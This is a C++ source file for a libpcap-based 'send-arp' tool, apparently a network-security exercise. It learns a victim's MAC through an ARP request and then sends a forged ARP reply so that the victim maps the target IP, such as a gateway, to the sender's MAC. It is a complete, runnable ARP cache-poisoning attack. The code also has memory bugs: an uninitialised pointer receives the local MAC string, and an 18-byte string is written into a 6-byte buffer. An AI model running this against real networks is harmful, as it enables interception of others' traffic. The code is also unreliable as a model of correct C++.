#include <cstdio>
#include <pcap.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <stdio.h>
#include <string.h>

#include <iostream>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <errno.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>

#include "ethhdr.h"
#include "arphdr.h"

using namespace std;

#pragma pack(push, 1)
struct EthArpPacket {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax : send-arp <interface> <sender ip> <target ip>\n");
    printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

void get_my_mac_addr(char * uc_Mac, char* iface_name)
{
     int fd;

    struct ifreq ifr;
    char *mac;

    fd = socket(AF_INET, SOCK_DGRAM, 0);

    ifr.ifr_addr.sa_family = AF_INET;
    strncpy((char *)ifr.ifr_name , (const char *)iface_name , IFNAMSIZ-1);

    ioctl(fd, SIOCGIFHWADDR, &ifr);

    close(fd);

    mac = (char *)ifr.ifr_hwaddr.sa_data;

    //display mac address
    sprintf((char *)uc_Mac,(const char *)"%02x:%02x:%02x:%02x:%02x:%02x\n" , mac[0]&0xff, mac[1]&0xff, mac[2]&0xff, mac[3]&0xff, mac[4]&0xff, mac[5]&0xff);

}

void get_my_ipv4_addr(char* ip_buffer, char* iface_name){
    int fd;
    struct ifreq ifr;

    fd = socket(AF_INET, SOCK_DGRAM, 0);

    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, iface_name, IFNAMSIZ -1);

    ioctl(fd, SIOCGIFADDR, &ifr);
    close(fd);

    sprintf(ip_buffer, "%s", inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
}

void send_packet_for_victim_mac_addr(pcap_t* handle, char* victim_ip, char* my_mac_addr, char* my_ipv4_addr){
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    packet.eth_.smac_ = Mac(my_mac_addr);
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = Mac(my_mac_addr);
    packet.arp_.sip_ = htonl(Ip(my_ipv4_addr));
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_ = htonl(Ip(victim_ip));

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
}

void recieve_packet_for_victim_mac_addr(pcap_t* handle, char* my_mac_addr, char* my_ipv4, char* victim_ip, char* victim_mac){
   while(true){
       struct pcap_pkthdr* header;
       const u_char* packet;
       int res = pcap_next_ex(handle, &header, &packet);
       if(res==0) continue;
       if(res == -1 || res == -2){
           printf("pcap_next_ex return %d(%s)", res, pcap_geterr(handle));
           break;
       }

       EthHdr* ethernet = (EthHdr*)packet;
       if(ethernet->type() != EthHdr::Arp) continue; //Check Ethernet type == ARP
       ArpHdr* arp = (ArpHdr*)(packet + sizeof (EthHdr));

       if(arp->hrd() != ArpHdr::ETHER) continue; // Check Hardware Type == Ethernet
       if(arp->pro() != EthHdr::Ip4) continue; // Check IPv == 4
       if(arp->op() != ArpHdr::Reply) continue; // Check Operation Code == Reply

       if(arp->sip() == Ip(victim_ip) && arp->tip() == Ip(my_ipv4) && arp->tmac() == Mac(my_mac_addr)){ // Check ARP Sender IP == Victim(Sender) IP & Check ARP Target IP == My IP & Check ARP Target Mac == My Mac Addr
           uint8_t* smac = arp->smac();
           snprintf(victim_mac, 18, "%02x:%02x:%02x:%02x:%02x:%02x", smac[0], smac[1], smac[2], smac[3], smac[4], smac[5]);
           break;
       }
   }
}

void send_arp_reply_attack(pcap_t* handle, char* my_mac_addr, char* my_ipv4, char* victim_mac_addr, char* victim_ip, char* target_ip){
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac(victim_mac_addr);
    packet.eth_.smac_ = Mac(my_mac_addr);
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = Mac(my_mac_addr);
    packet.arp_.sip_ = htonl(Ip(target_ip));
    packet.arp_.tmac_ = Mac(victim_mac_addr);
    packet.arp_.tip_ = htonl(Ip(victim_ip));

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
}

int main(int argc, char* argv[]) {
    if (argc != 4) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

    char* my_mac_addr;
    get_my_mac_addr(my_mac_addr, argv[1]);
    printf("My Mac Addr: %s", my_mac_addr);

    char my_ipv4[40] = {0, };
    get_my_ipv4_addr(my_ipv4, argv[1]);
    printf("My IPv4 Addr: %s\n", my_ipv4);

    char victim_mac[6] = {0, };
    send_packet_for_victim_mac_addr(handle, argv[2], my_mac_addr, my_ipv4);
    recieve_packet_for_victim_mac_addr(handle, my_mac_addr, my_ipv4, argv[2], victim_mac);
    printf("Victim's Mac Addr: %s\n", victim_mac);

    printf("Sending Reply Attack Packet...\n");
    send_arp_reply_attack(handle, my_mac_addr, my_ipv4, victim_mac, argv[2], argv[3]);
    printf("Send Complete!\n");

    pcap_close(handle);
}
